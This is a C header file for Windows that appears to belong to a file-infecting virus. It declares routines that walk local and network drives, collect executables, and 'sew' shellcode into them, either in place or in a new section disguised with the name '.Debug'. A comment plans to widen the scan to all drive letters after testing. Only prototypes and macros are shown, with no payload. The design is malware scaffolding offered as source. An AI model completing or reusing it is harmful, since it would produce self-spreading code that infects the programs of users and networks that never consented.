#pragma once
#pragma comment(lib, "shlwapi.lib")
#pragma comment(lib, "ImageHlp.lib")
#pragma warning (disable : 4146)

#include <shlwapi.h>
#include <windows.h>
#include <windef.h>
#include <tchar.h>
#include <stdio.h>
#include <ImageHlp.h>

//defines
#define TYPE_FILE	1
#define TYPE_DIR	2
#define TYPE_DOT	3
#define NOT_VALID_EXE 10
#define NOT_ENUFF_SPACE 11
#define MAXDRIVES 24 //change this to 26 once done with the tests
#define SECTION_NAME ".Debug"
#define SECTION_SIZE 1000
// Source: https://blogs.oracle.com/jwadams/macros-and-powers-of-two
// align x down to the nearest multiple of align. align must be a power of 2.
#define P2ALIGNDOWN(x, align) ((x) & -(align))
// align x up to the nearest multiple of align. align must be a power of 2.
#define P2ALIGNUP(x, align) (-(-(x) & -(align)))

//Prototypes
DWORD GetAvailableDrives(void);
BOOL SewExecutable();
DWORD BrowseDrive(LPTSTR szDrive);
DWORD GetNetworkConnectedDrives(LPCTSTR szDriveNameToCheck, LPTSTR destBuffer);
BOOL IsExe(LPTSTR fName, PDWORD pdwBinaryType);
DWORD TypeOfFile(LPWIN32_FIND_DATA lpFindData);
struct sExeFiles *CreateExeList(struct sExeFiles);
VOID InsertExeFile(struct sExeFiles **List, LPTSTR szFileName, PDWORD pdwBinaryType);
DWORD SewShellcode(struct sExeFiles *sNode);
DWORD SewShellcodeNewSection(struct sExeFiles *sNode);
VOID UpdateExeList(VOID);
VOID RemoveExeFile(struct sExeFiles **List, LPTSTR szFileName);
VOID CleanupExeList(struct sExeFiles *List);
DWORD Align(DWORD dwSize, DWORD dwAlign, DWORD dwAddr);